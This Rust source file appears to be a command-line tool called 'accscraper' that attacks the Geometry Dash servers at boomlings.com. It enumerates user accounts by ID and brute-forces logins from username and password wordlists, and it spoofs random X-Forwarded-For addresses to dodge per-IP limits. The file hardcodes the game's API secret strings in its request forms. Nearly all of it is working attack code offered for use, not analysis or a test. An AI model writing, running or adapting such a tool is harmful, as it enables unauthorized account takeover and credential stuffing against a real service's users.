// Too much cloning and too many runtimes

#![feature(async_closure)]

extern crate reqwest;
extern crate rand;
extern crate num_cpus;
extern crate threadpool;

mod multiprocessing;

use tokio::runtime::Runtime;
use multiprocessing::ThreadPool;
use rand::Rng;
use reqwest::Client;
use std::{
    env,
    error,
    io::{self, prelude::*, BufReader},
    fs::File,
    sync::Arc
};
use std::time::Duration;
use std::thread;

struct Scraper;

impl Scraper {
    pub fn new() -> Scraper { Scraper }

    pub fn arc() -> Arc<Scraper> {
        Arc::new(Scraper::new())
    }

    /// Read the file from `file_name` line by line
    ///
    /// # Panics
    ///
    /// Panics when file is inaccessible.
    pub fn read(file_name: &str) -> io::Result<Vec<String>> {
        let file = File::open(file_name)?;
        let reader = BufReader::new(file);
        Ok(reader.lines()
            .map(|x| x.unwrap())
            .collect::<Vec<String>>())
    }

    /// Generates a random IP for XFF. Gen. array of values between 0-255 and join it with "."
    fn random_ip(&self) -> String {
        (0..4).map(|_| rand::thread_rng()
            .gen_range(0, 255)
            .to_string())
            .collect::<Vec<String>>().join(".")
    }

    /// Searches for user with `search_str`.
    fn get_user(&self, search_str: &str)
        -> Result<String, Box<dyn error::Error>> {
        let (mut runtime1, mut runtime2) = (Runtime::new()?, Runtime::new()?);
        Ok(runtime1.block_on(runtime2.block_on(
            Client::new().post("http://boomlings.com/database/getGJUsers20.php")
                .header("X-Forwarded-For", &self.random_ip())
                .form(&[
                    ("gameVersion", "21"),
                    ("binaryVersion", "34"),
                    ("gdw", "0"),
                    ("str", search_str),
                    ("total", "0"),
                    ("page", "0"),
                    ("secret", "Wmfd2893gb7")
                ])
                .send())?
                .text())?)
    }

    /// Logins with `username` and `password`. Uses XFF
    /// Warning: Does not check server response code.
    ///
    /// # Panics
    ///
    /// Panics on send() or text().
    fn login(&self, username: &str, password: &str)
        -> Result<bool, Box<dyn error::Error>> {
        let (mut runtime1, mut runtime2) = (Runtime::new()?, Runtime::new()?);
        Ok(runtime1.block_on(runtime2.block_on(
            Client::new().post("http://boomlings.com/database/accounts/loginGJAccount.php")
                .header("X-Forwarded-For", &self.random_ip())
                .form(&[
                    ("udid", "121232"),
                    ("userName", username),
                    ("password", password),
                    ("sID", "324322"),
                    ("secret", "Wmfv3899gc9")
                ])
                .send())?
                .text())?
                .contains(","))
    }

    /// Brute forces into the account associated with `username` and tries each entry
    /// in `passwords`.
    fn brute_login_user(self: Arc<Self>, username: String, passwords: Vec<String>) {
        // Panics on `send()` or `text()` of `self.login()`.
        for password in passwords {
            let cloned_self = self.clone();
            let cloned_username = username.clone();
            let maybe_modified_password = if password.contains("<username>") {
                password.replace("<username>", &cloned_username)
            } else { password };
            let resp = cloned_self.login(&cloned_username, &maybe_modified_password);
            match resp {
                Ok(cond) =>
                    if(cond) { println!("{}:{}", cloned_username, maybe_modified_password); }
                Err(_) => {}
            }
        }
    }

    /// Iterates over each entry in `usernames` and tries `passwords` on said entry with
    /// `self.brute_login_user()`. A thread pool is spawned with `username_worker`
    /// amount of workers.
    pub fn brute_login(
        self: Arc<Self>,
        usernames: Vec<String>, passwords: Vec<String>,
        username_workers: i32
    ) {
        {
            ThreadPool::with_workers(username_workers as usize).imap(
                move |username: String| {
                    let cloned_self = self.clone();
                    let cloned_passwords = passwords.clone();
                    cloned_self.brute_login_user(username, cloned_passwords);
                },
                usernames);
            loop {}
        }
    }

    /// Index (`idx`) is called with `self.get_user()` and is used as a User ID.
    /// If `self.get_user()` panics, it is replaced with an empty string buffer.
    /// The string buffer is then checked if it contains a ":", if it does the
    /// string buffer is split with ":" as a delimiter and the second part of it
    /// is printed out a found username/account.
    pub fn try_user(self: Arc<Self>, idx: i32) {
        let user_string = self
            .get_user(&idx.to_string())
            .unwrap_or(String::new());
        if user_string.contains(":") {
            let parts: Vec<&str> = user_string.split(":").collect();
            println!("{}", parts[1]);
        }
    }

    /// Enumerates users with `from_id` as a starting point for User IDs.
    /// A thread pool is spawned with `workers` amount of workers.
    pub fn enum_users(self: Arc<Self>, from_id: i32, workers: i32) {
        let mut index = from_id.clone();
        loop {
            {
                let cloned_index = index.clone();
                let cloned_self = self.clone();
                ThreadPool::with_workers(workers as usize).imap(move |n: i32| {
                        let cloned_moved_self = cloned_self.clone();
                        cloned_moved_self.try_user(cloned_index + n);
                    }, 0..workers);
            }
            index += workers;
        }
    }
}

fn main() -> Result<(), Box<dyn error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() > 1 {
        // Handles arguments
        match args[1].as_ref() {
            "--scrape-users" => {
                if args.len() != 4 {
                    println!("Usage: ./accscraper --scrape-users [FromID] [Workers]");
                } else {
                    let scraper = Scraper::arc();
                    let from_id: i32 = args[2].parse()?;
                    let workers: i32 = args[3].parse()?;
                    scraper.enum_users(from_id, workers);
                }
            },
            "--brute-login" => {
                if args.len() != 5 {
                    println!("Usage: ./accscraper --brute-login [Usernames] [Passwords] [UsernameWorkers]")
                }
                let scraper = Scraper::arc();
                let usernames = Scraper::read(&args[2])?;
                let passwords= Scraper::read(&args[3])?;
                let un_workers: i32 = args[4].parse()?;
                scraper.brute_login(usernames, passwords, un_workers);
            },
            _ => {
                panic!("{} is not an option.", &args[1]);
            }
        }
    } else {
        println!("./accscraper [--scrape-users|--brute-login]")
    }
    Ok(())
}